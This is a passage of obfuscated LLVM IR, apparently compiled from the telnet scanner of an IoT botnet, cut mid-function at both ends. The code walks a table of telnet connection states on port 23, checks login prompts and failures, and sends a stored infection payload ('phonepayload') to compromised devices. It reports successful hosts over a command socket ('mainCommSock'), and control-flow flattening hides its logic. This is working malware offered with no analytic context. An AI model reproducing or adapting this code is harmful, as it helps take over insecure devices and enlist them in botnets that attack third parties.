  %531 = call i32 @contains_fail(i8* %530)
  %532 = icmp ne i32 %531, 0
  %533 = select i1 %532, i32 1178308357, i32 -335289396
  store i32 %533, i32* %switchVar
  br label %loopEnd

; <label>:534:                                    ; preds = %loopEntry
  %535 = load i32, i32* %2, align 4
  %536 = sext i32 %535 to i64
  %537 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %536
  %538 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %537, i32 0, i32 2
  store i8 0, i8* %538, align 8
  store i32 -900621277, i32* %switchVar
  br label %loopEnd

; <label>:539:                                    ; preds = %loopEntry
  %540 = load i32, i32* @mainCommSock, align 4
  %541 = load i32, i32* %2, align 4
  %542 = sext i32 %541 to i64
  %543 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %542
  %544 = call i8* @get_telstate_host(%struct.telstate_t* %543)
  %545 = call i32 (i32, i8*, ...) @sockprintf(i32 %540, i8* getelementptr inbounds ([109 x i8], [109 x i8]* @.str.304, i32 0, i32 0), i8* %544)
  %546 = load i32, i32* %2, align 4
  %547 = sext i32 %546 to i64
  %548 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %547
  %549 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %548, i32 0, i32 2
  store i8 7, i8* %549, align 8
  store i32 -900621277, i32* %switchVar
  br label %loopEnd

; <label>:550:                                    ; preds = %loopEntry
  store i32 761967062, i32* %switchVar
  br label %loopEnd

; <label>:551:                                    ; preds = %loopEntry
  %552 = load i32, i32* %2, align 4
  %553 = sext i32 %552 to i64
  %554 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %553
  %555 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %554, i32 0, i32 7
  %556 = load i32, i32* %555, align 16
  %557 = add i32 %556, 7
  %558 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %559 = icmp ult i32 %557, %558
  %560 = select i1 %559, i32 2085133443, i32 -764359075
  store i32 %560, i32* %switchVar
  br label %loopEnd

; <label>:561:                                    ; preds = %loopEntry
  %562 = load i32, i32* %2, align 4
  %563 = sext i32 %562 to i64
  %564 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %563
  %565 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %564, i32 0, i32 2
  store i8 0, i8* %565, align 8
  %566 = load i32, i32* %2, align 4
  %567 = sext i32 %566 to i64
  %568 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %567
  %569 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %568, i32 0, i32 3
  store i8 1, i8* %569, align 1
  store i32 -764359075, i32* %switchVar
  br label %loopEnd

; <label>:570:                                    ; preds = %loopEntry
  store i32 387971381, i32* %switchVar
  br label %loopEnd

; <label>:571:                                    ; preds = %loopEntry
  %572 = load i32, i32* %2, align 4
  %573 = sext i32 %572 to i64
  %574 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %573
  %575 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %574, i32 0, i32 0
  %576 = load i32, i32* %575, align 16
  %577 = call i64 @send(i32 %576, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.305, i32 0, i32 0), i64 4, i32 16384)
  %578 = icmp slt i64 %577, 0
  %579 = select i1 %578, i32 818743611, i32 673617614
  store i32 %579, i32* %switchVar
  br label %loopEnd

; <label>:580:                                    ; preds = %loopEntry
  %581 = load i32, i32* %2, align 4
  %582 = sext i32 %581 to i64
  %583 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %582
  %584 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %583, i32 0, i32 2
  store i8 0, i8* %584, align 8
  %585 = load i32, i32* %2, align 4
  %586 = sext i32 %585 to i64
  %587 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %586
  %588 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %587, i32 0, i32 3
  store i8 1, i8* %588, align 1
  store i32 761967062, i32* %switchVar
  br label %loopEnd

; <label>:589:                                    ; preds = %loopEntry
  %590 = load i32, i32* %2, align 4
  %591 = sext i32 %590 to i64
  %592 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %591
  %593 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %592, i32 0, i32 2
  store i8 8, i8* %593, align 8
  store i32 387971381, i32* %switchVar
  br label %loopEnd

; <label>:594:                                    ; preds = %loopEntry
  %595 = load i32, i32* %2, align 4
  %596 = sext i32 %595 to i64
  %597 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %596
  %598 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %597, i32 0, i32 0
  %599 = load i32, i32* %598, align 16
  %600 = load i32, i32* %2, align 4
  %601 = sext i32 %600 to i64
  %602 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %601
  %603 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %602, i32 0, i32 9
  %604 = load i8*, i8** %603, align 8
  %605 = call i32 @read_until_response(i32 %599, i32 10000, i8* %604, i32 512, i8** getelementptr inbounds ([7 x i8*], [7 x i8*]* @phone, i32 0, i32 0))
  %606 = icmp ne i32 %605, 0
  %607 = select i1 %606, i32 -406367482, i32 -877306323
  store i32 %607, i32* %switchVar
  br label %loopEnd

; <label>:608:                                    ; preds = %loopEntry
  %609 = load i32, i32* %2, align 4
  %610 = sext i32 %609 to i64
  %611 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %610
  %612 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %611, i32 0, i32 9
  %613 = load i8*, i8** %612, align 8
  %614 = call i32 @contains_fail(i8* %613)
  %615 = icmp ne i32 %614, 0
  %616 = select i1 %615, i32 -609259397, i32 -1264234469
  store i32 %616, i32* %switchVar
  br label %loopEnd

; <label>:617:                                    ; preds = %loopEntry
  %618 = load i32, i32* %2, align 4
  %619 = sext i32 %618 to i64
  %620 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %619
  %621 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %620, i32 0, i32 2
  store i8 0, i8* %621, align 8
  store i32 1230625980, i32* %switchVar
  br label %loopEnd

; <label>:622:                                    ; preds = %loopEntry
  %623 = load i32, i32* %2, align 4
  %624 = sext i32 %623 to i64
  %625 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %624
  %626 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %625, i32 0, i32 2
  store i8 9, i8* %626, align 8
  store i32 1230625980, i32* %switchVar
  br label %loopEnd

; <label>:627:                                    ; preds = %loopEntry
  store i32 761967062, i32* %switchVar
  br label %loopEnd

; <label>:628:                                    ; preds = %loopEntry
  %629 = load i32, i32* %2, align 4
  %630 = sext i32 %629 to i64
  %631 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %630
  %632 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %631, i32 0, i32 7
  %633 = load i32, i32* %632, align 16
  %634 = add i32 %633, 6
  %635 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %636 = icmp ult i32 %634, %635
  %637 = select i1 %636, i32 80171499, i32 654502418
  store i32 %637, i32* %switchVar
  br label %loopEnd

; <label>:638:                                    ; preds = %loopEntry
  %639 = load i32, i32* %2, align 4
  %640 = sext i32 %639 to i64
  %641 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %640
  %642 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %641, i32 0, i32 2
  store i8 0, i8* %642, align 8
  %643 = load i32, i32* %2, align 4
  %644 = sext i32 %643 to i64
  %645 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %644
  %646 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %645, i32 0, i32 3
  store i8 1, i8* %646, align 1
  store i32 654502418, i32* %switchVar
  br label %loopEnd

; <label>:647:                                    ; preds = %loopEntry
  store i32 387971381, i32* %switchVar
  br label %loopEnd

; <label>:648:                                    ; preds = %loopEntry
  %649 = load i32, i32* %2, align 4
  %650 = sext i32 %649 to i64
  %651 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %650
  %652 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %651, i32 0, i32 0
  %653 = load i32, i32* %652, align 16
  %654 = call i64 @send(i32 %653, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.306, i32 0, i32 0), i64 12, i32 16384)
  %655 = icmp slt i64 %654, 0
  %656 = select i1 %655, i32 1513184323, i32 1291519590
  store i32 %656, i32* %switchVar
  br label %loopEnd

; <label>:657:                                    ; preds = %loopEntry
  %658 = load i32, i32* %2, align 4
  %659 = sext i32 %658 to i64
  %660 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %659
  %661 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %660, i32 0, i32 2
  store i8 0, i8* %661, align 8
  %662 = load i32, i32* %2, align 4
  %663 = sext i32 %662 to i64
  %664 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %663
  %665 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %664, i32 0, i32 3
  store i8 1, i8* %665, align 1
  store i32 761967062, i32* %switchVar
  br label %loopEnd

; <label>:666:                                    ; preds = %loopEntry
  %667 = load i32, i32* %2, align 4
  %668 = sext i32 %667 to i64
  %669 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %668
  %670 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %669, i32 0, i32 2
  store i8 10, i8* %670, align 8
  store i32 387971381, i32* %switchVar
  br label %loopEnd

; <label>:671:                                    ; preds = %loopEntry
  %672 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %673 = load i32, i32* %2, align 4
  %674 = sext i32 %673 to i64
  %675 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %674
  %676 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %675, i32 0, i32 7
  store i32 %672, i32* %676, align 16
  %677 = load i32, i32* %2, align 4
  %678 = sext i32 %677 to i64
  %679 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %678
  %680 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %679, i32 0, i32 0
  %681 = load i32, i32* %680, align 16
  %682 = load i8*, i8** @phonepayload, align 8
  %683 = load i8*, i8** @phonepayload, align 8
  %684 = call i64 @strlen(i8* %683) #10
  %685 = call i64 @send(i32 %681, i8* %682, i64 %684, i32 16384)
  %686 = icmp slt i64 %685, 0
  %687 = select i1 %686, i32 -1435563706, i32 404704917
  store i32 %687, i32* %switchVar
  br label %loopEnd

; <label>:688:                                    ; preds = %loopEntry
  %689 = load i32, i32* %2, align 4
  %690 = sext i32 %689 to i64
  %691 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %690
  %692 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %691, i32 0, i32 0
  %693 = load i32, i32* %692, align 16
  %694 = call i32 @sclose(i32 %693)
  %695 = load i32, i32* %2, align 4
  %696 = sext i32 %695 to i64
  %697 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %696
  %698 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %697, i32 0, i32 2
  store i8 0, i8* %698, align 8
  %699 = load i32, i32* %2, align 4
  %700 = sext i32 %699 to i64
  %701 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %700
  %702 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %701, i32 0, i32 3
  store i8 1, i8* %702, align 1
  store i32 761967062, i32* %switchVar
  br label %loopEnd

; <label>:703:                                    ; preds = %loopEntry
  %704 = load i32, i32* %2, align 4
  %705 = sext i32 %704 to i64
  %706 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %705
  %707 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %706, i32 0, i32 3
  store i8 3, i8* %707, align 1
  %708 = load i32, i32* %2, align 4
  %709 = sext i32 %708 to i64
  %710 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %709
  %711 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %710, i32 0, i32 7
  %712 = load i32, i32* %711, align 16
  %713 = add i32 %712, 60
  %714 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %715 = icmp ult i32 %713, %714
  %716 = select i1 %715, i32 -1513044218, i32 950878214
  store i32 %716, i32* %switchVar
  br label %loopEnd

; <label>:717:                                    ; preds = %loopEntry
  %718 = load i32, i32* %2, align 4
  %719 = sext i32 %718 to i64
  %720 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %719
  %721 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %720, i32 0, i32 3
  %722 = load i8, i8* %721, align 1
  %723 = zext i8 %722 to i32
  %724 = icmp ne i32 %723, 3
  %725 = select i1 %724, i32 1031687452, i32 94985865
  store i32 %725, i32* %switchVar
  br label %loopEnd

; <label>:726:                                    ; preds = %loopEntry
  store i32 94985865, i32* %switchVar
  br label %loopEnd

; <label>:727:                                    ; preds = %loopEntry
  %728 = load i32, i32* %2, align 4
  %729 = sext i32 %728 to i64
  %730 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %729
  %731 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %730, i32 0, i32 2
  store i8 0, i8* %731, align 8
  %732 = load i32, i32* %2, align 4
  %733 = sext i32 %732 to i64
  %734 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %733
  %735 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %734, i32 0, i32 3
  store i8 1, i8* %735, align 1
  store i32 950878214, i32* %switchVar
  br label %loopEnd

; <label>:736:                                    ; preds = %loopEntry
  store i32 387971381, i32* %switchVar
  br label %loopEnd

NewDefault:                                       ; preds = %loopEntry
  store i32 387971381, i32* %switchVar
  br label %loopEnd

; <label>:737:                                    ; preds = %loopEntry
  store i32 761967062, i32* %switchVar
  br label %loopEnd

; <label>:738:                                    ; preds = %loopEntry
  %739 = load i32, i32* %2, align 4
  %740 = add nsw i32 %739, 1
  store i32 %740, i32* %2, align 4
  store i32 -2123187885, i32* %switchVar
  br label %loopEnd

; <label>:741:                                    ; preds = %loopEntry
  store i32 2055106136, i32* %switchVar
  br label %loopEnd

; <label>:742:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %741, %738, %737, %NewDefault, %736, %727, %726, %717, %703, %688, %671, %666, %657, %648, %647, %638, %628, %627, %622, %617, %608, %594, %589, %580, %571, %570, %561, %551, %550, %539, %534, %520, %506, %501, %492, %483, %482, %473, %463, %462, %457, %452, %443, %429, %424, %415, %406, %405, %396, %386, %385, %380, %375, %366, %352, %351, %336, %326, %325, %310, %306, %305, %274, %259, %248, %216, %215, %206, %205, %204, %195, %184, %179, %156, %155, %130, %110, %101, %LeafBlock, %NodeBlock, %NodeBlock1, %NodeBlock3, %NodeBlock5, %NodeBlock7, %NodeBlock9, %LeafBlock11, %NodeBlock13, %NodeBlock15, %NodeBlock17, %NodeBlock19, %82, %76, %68, %63, %62, %61, %60, %57, %43, %38, %switchDefault
  br label %loopEntry
}

declare i32 @time(...) #4

; Function Attrs: nounwind
declare void @srand(i32) #2

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #5

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #2

; Function Attrs: noinline nounwind uwtable
define void @StartTheLelz() #0 {
  %.reg2mem = alloca i32
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca [128 x i8], align 16
  %6 = alloca i8, align 1
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct.__sigset_t, align 8
  %11 = alloca %struct.timeval, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca [256 x i8], align 16
  %15 = alloca i8*, align 8
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca i8*, align 8
  %18 = alloca i8*, align 8
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  store i32 10, i32* %7, align 4
  store i32 1000, i32* %8, align 4
  %21 = load i32, i32* %8, align 4
  store i32 %21, i32* %9, align 4
  %22 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %23 = call i32 @rand_cmwc()
  %24 = xor i32 %22, %23
  call void @srand(i32 %24) #5
  %25 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %25, align 4
  %26 = call zeroext i16 @htons(i16 zeroext 23) #13
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %26, i16* %27, align 2
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 3
  %29 = getelementptr inbounds [8 x i8], [8 x i8]* %28, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %29, i8 0, i64 8, i32 4, i1 false)
  %30 = call noalias i8* @malloc(i64 513) #5
  store i8* %30, i8** %15, align 8
  %31 = load i8*, i8** %15, align 8
  call void @llvm.memset.p0i8.i64(i8* %31, i8 0, i64 513, i32 1, i1 false)
  %32 = load i32, i32* %9, align 4
  %33 = zext i32 %32 to i64
  %34 = call i8* @llvm.stacksave()
  store i8* %34, i8** %17, align 8
  %35 = alloca %struct.telstate_t, i64 %33, align 16
  %36 = bitcast %struct.telstate_t* %35 to i8*
  %37 = load i32, i32* %9, align 4
  %38 = sext i32 %37 to i64
  %39 = mul i64 %38, 5
  call void @llvm.memset.p0i8.i64(i8* %36, i8 0, i64 %39, i32 16, i1 false)
  store i32 0, i32* %1, align 4
  %switchVar = alloca i32
  store i32 697071828, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar15 = load i32, i32* %switchVar
  switch i32 %switchVar15, label %switchDefault [
    i32 697071828, label %40
    i32 -571850177, label %45
    i32 -2145655418, label %59
    i32 34983434, label %62
    i32 117507373, label %63
    i32 1335783610, label %71
    i32 -986386261, label %72
    i32 -2098544457, label %73
    i32 630897570, label %74
    i32 -1383061144, label %75
    i32 -395058849, label %80
    i32 -2110268175, label %88
    i32 -685787902, label %94
    i32 131638610, label %NodeBlock13
    i32 1278765885, label %NodeBlock11
    i32 1397310759, label %NodeBlock9
    i32 -788332863, label %LeafBlock7
    i32 372297275, label %NodeBlock5
    i32 -1781547534, label %NodeBlock3
    i32 -886374980, label %NodeBlock1
    i32 -696807160, label %NodeBlock
    i32 45696841, label %LeafBlock
    i32 -1181292788, label %110
    i32 323238367, label %118
    i32 -851448573, label %138
    i32 -1426651107, label %147
    i32 424559759, label %168
    i32 -1246952535, label %173
    i32 -1442330642, label %182
    i32 1120296967, label %187
    i32 1891362902, label %188
    i32 -436185225, label %189
    i32 -793614247, label %214
    i32 -196725554, label %215
    i32 -67065894, label %238
    i32 351758106, label %243
    i32 -753794429, label %247
    i32 2108760656, label %251
    i32 -455965382, label %252
    i32 540234939, label %253
    i32 1565826636, label %262
    i32 -1102309949, label %263
    i32 -625855368, label %297
    i32 -711943273, label %308
    i32 -1675042194, label %312
    i32 1602534393, label %329
    i32 742808537, label %330
    i32 655843878, label %334
    i32 -1385651820, label %338
    i32 -746353829, label %339
    i32 1724614755, label %349
    i32 -1244231729, label %353
    i32 1302515062, label %354
    i32 -1547451391, label %369
    i32 -1967981378, label %378
    i32 -355267141, label %382
    i32 1080257533, label %386
    i32 -167712634, label %387
    i32 241113800, label %397
    i32 -519040166, label %401
    i32 -1820604608, label %402
    i32 1805370421, label %428
    i32 -1601444231, label %432
    i32 -1951238615, label %441
    i32 1774313942, label %445
    i32 1113504117, label %449
    i32 1018917067, label %464
    i32 -1206526110, label %473
    i32 -2035984850, label %477
    i32 649005541, label %481
    i32 -818172623, label %482
    i32 1963342919, label %492
    i32 955648949, label %496
    i32 -1553946644, label %497
    i32 -844485240, label %523
    i32 -926175402, label %527
    i32 820028042, label %536
    i32 -1420498009, label %540
    i32 1318651911, label %544
    i32 2110204316, label %559
    i32 669824758, label %573
    i32 -1172019520, label %577
    i32 809173975, label %586
    i32 1406380376, label %595
    i32 1778631701, label %599
    i32 -1930977388, label %625
    i32 130389304, label %626
    i32 -1141860344, label %630
    i32 646272934, label %631
    i32 120210548, label %632
    i32 1023087260, label %642
    i32 512010778, label %646
    i32 -1086291204, label %647
    i32 -2127298093, label %661
    i32 2058447376, label %662
    i32 556024474, label %671
    i32 276009398, label %672
    i32 -80114356, label %684
    i32 1940259574, label %696
    i32 1896588110, label %700
    i32 -1450828027, label %701
    i32 -191343010, label %716
    i32 -2127307352, label %725
    i32 -687273130, label %734
    i32 208833226, label %761
    i32 -235621126, label %762
    i32 1832921008, label %772
    i32 926577276, label %781
    i32 -252493545, label %782
    i32 331533551, label %786
    i32 -570351439, label %NewDefault
    i32 -530316569, label %787
    i32 625756886, label %788
    i32 1136258732, label %791
    i32 671732049, label %792
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i32, i32* %1, align 4
  %42 = load i32, i32* %9, align 4
  %43 = icmp slt i32 %41, %42
  %44 = select i1 %43, i32 -571850177, i32 34983434
  store i32 %44, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  %46 = load i32, i32* %1, align 4
  %47 = sext i32 %46 to i64
  %48 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %47
  %49 = bitcast %struct.telstate_t* %48 to i8*
  call void @llvm.memset.p0i8.i64(i8* %49, i8 0, i64 32, i32 16, i1 false)
  %50 = load i32, i32* %1, align 4
  %51 = sext i32 %50 to i64
  %52 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %51
  %53 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %52, i32 0, i32 3
  store i8 1, i8* %53, align 1
  %54 = load i8*, i8** %15, align 8
  %55 = load i32, i32* %1, align 4
  %56 = sext i32 %55 to i64
  %57 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %56
  %58 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %57, i32 0, i32 9
  store i8* %54, i8** %58, align 8
  store i32 -2145655418, i32* %switchVar
  br label %loopEnd

; <label>:59:                                     ; preds = %loopEntry
  %60 = load i32, i32* %1, align 4
  %61 = add nsw i32 %60, 1
  store i32 %61, i32* %1, align 4
  store i32 697071828, i32* %switchVar
  br label %loopEnd

; <label>:62:                                     ; preds = %loopEntry
  store i32 0, i32* %3, align 4
  store i32 117507373, i32* %switchVar
  br label %loopEnd

; <label>:63:                                     ; preds = %loopEntry
  %64 = load i32, i32* %3, align 4
  %65 = add nsw i32 %64, 1
  store i32 %65, i32* %3, align 4
  %66 = sext i32 %65 to i64
  %67 = getelementptr inbounds [11 x i8*], [11 x i8*]* @tmpdirs, i64 0, i64 %66
  %68 = load i8*, i8** %67, align 8
  %69 = icmp ne i8* %68, null
  %70 = select i1 %69, i32 1335783610, i32 -986386261
  store i32 %70, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  store i32 117507373, i32* %switchVar
  br label %loopEnd

; <label>:72:                                     ; preds = %loopEntry
  store i32 -2098544457, i32* %switchVar
  br label %loopEnd

; <label>:73:                                     ; preds = %loopEntry
  store i32 630897570, i32* %switchVar
  br label %loopEnd

; <label>:74:                                     ; preds = %loopEntry
  store i32 0, i32* %1, align 4
  store i32 -1383061144, i32* %switchVar
  br label %loopEnd

; <label>:75:                                     ; preds = %loopEntry
  %76 = load i32, i32* %1, align 4
  %77 = load i32, i32* %9, align 4
  %78 = icmp slt i32 %76, %77
  %79 = select i1 %78, i32 -395058849, i32 1136258732
  store i32 %79, i32* %switchVar
  br label %loopEnd

; <label>:80:                                     ; preds = %loopEntry
  %81 = load i32, i32* %1, align 4
  %82 = sext i32 %81 to i64
  %83 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %82
  %84 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %83, i32 0, i32 7
  %85 = load i32, i32* %84, align 16
  %86 = icmp eq i32 %85, 0
  %87 = select i1 %86, i32 -2110268175, i32 -685787902
  store i32 %87, i32* %switchVar
  br label %loopEnd

; <label>:88:                                     ; preds = %loopEntry
  %89 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %90 = load i32, i32* %1, align 4
  %91 = sext i32 %90 to i64
  %92 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %91
  %93 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %92, i32 0, i32 7
  store i32 %89, i32* %93, align 16
  store i32 -685787902, i32* %switchVar
  br label %loopEnd

; <label>:94:                                     ; preds = %loopEntry
  %95 = load i32, i32* %1, align 4
  %96 = sext i32 %95 to i64
  %97 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %96
  %98 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %97, i32 0, i32 2
  %99 = load i8, i8* %98, align 8
  %100 = zext i8 %99 to i32
  store i32 %100, i32* %.reg2mem
  store i32 131638610, i32* %switchVar
  br label %loopEnd

NodeBlock13:                                      ; preds = %loopEntry
  %.reload23 = load volatile i32, i32* %.reg2mem
  %Pivot14 = icmp slt i32 %.reload23, 4
  %101 = select i1 %Pivot14, i32 -1781547534, i32 1278765885
  store i32 %101, i32* %switchVar
  br label %loopEnd

NodeBlock11:                                      ; preds = %loopEntry
  %.reload18 = load volatile i32, i32* %.reg2mem
  %Pivot12 = icmp slt i32 %.reload18, 6
  %102 = select i1 %Pivot12, i32 372297275, i32 1397310759
  store i32 %102, i32* %switchVar
  br label %loopEnd

NodeBlock9:                                       ; preds = %loopEntry
  %.reload16 = load volatile i32, i32* %.reg2mem
  %Pivot10 = icmp slt i32 %.reload16, 7
  %103 = select i1 %Pivot10, i32 1318651911, i32 -788332863
  store i32 %103, i32* %switchVar
  br label %loopEnd

LeafBlock7:                                       ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %SwitchLeaf8 = icmp eq i32 %.reload, 7
  %104 = select i1 %SwitchLeaf8, i32 -1086291204, i32 -570351439
  store i32 %104, i32* %switchVar
  br label %loopEnd

NodeBlock5:                                       ; preds = %loopEntry
  %.reload17 = load volatile i32, i32* %.reg2mem
  %Pivot6 = icmp slt i32 %.reload17, 5
  %105 = select i1 %Pivot6, i32 1113504117, i32 -1553946644
  store i32 %105, i32* %switchVar
  br label %loopEnd

NodeBlock3:                                       ; preds = %loopEntry
  %.reload22 = load volatile i32, i32* %.reg2mem
  %Pivot4 = icmp slt i32 %.reload22, 2
  %106 = select i1 %Pivot4, i32 -696807160, i32 -886374980
  store i32 %106, i32* %switchVar
  br label %loopEnd

NodeBlock1:                                       ; preds = %loopEntry
  %.reload19 = load volatile i32, i32* %.reg2mem
  %Pivot2 = icmp slt i32 %.reload19, 3
  %107 = select i1 %Pivot2, i32 1302515062, i32 -1820604608
  store i32 %107, i32* %switchVar
  br label %loopEnd

NodeBlock:                                        ; preds = %loopEntry
  %.reload21 = load volatile i32, i32* %.reg2mem
  %Pivot = icmp slt i32 %.reload21, 1
  %108 = select i1 %Pivot, i32 45696841, i32 -455965382
  store i32 %108, i32* %switchVar
  br label %loopEnd

LeafBlock:                                        ; preds = %loopEntry
  %.reload20 = load volatile i32, i32* %.reg2mem
  %SwitchLeaf = icmp eq i32 %.reload20, 0
  %109 = select i1 %SwitchLeaf, i32 -1181292788, i32 -570351439
  store i32 %109, i32* %switchVar
  br label %loopEnd

; <label>:110:                                    ; preds = %loopEntry
  %111 = load i32, i32* %1, align 4
  %112 = sext i32 %111 to i64
  %113 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %112
  %114 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %113, i32 0, i32 3
  %115 = load i8, i8* %114, align 1
  %116 = icmp ne i8 %115, 0
  %117 = select i1 %116, i32 323238367, i32 -851448573
  store i32 %117, i32* %switchVar
  br label %loopEnd

; <label>:118:                                    ; preds = %loopEntry
  %119 = load i32, i32* %1, align 4
  %120 = sext i32 %119 to i64
  %121 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %120
  %122 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %121, i32 0, i32 9
  %123 = load i8*, i8** %122, align 8
  store i8* %123, i8** %18, align 8
  %124 = load i32, i32* %1, align 4
  %125 = sext i32 %124 to i64
  %126 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %125
  %127 = bitcast %struct.telstate_t* %126 to i8*
  call void @llvm.memset.p0i8.i64(i8* %127, i8 0, i64 32, i32 16, i1 false)
  %128 = load i8*, i8** %18, align 8
  %129 = load i32, i32* %1, align 4
  %130 = sext i32 %129 to i64
  %131 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %130
  %132 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %131, i32 0, i32 9
  store i8* %128, i8** %132, align 8
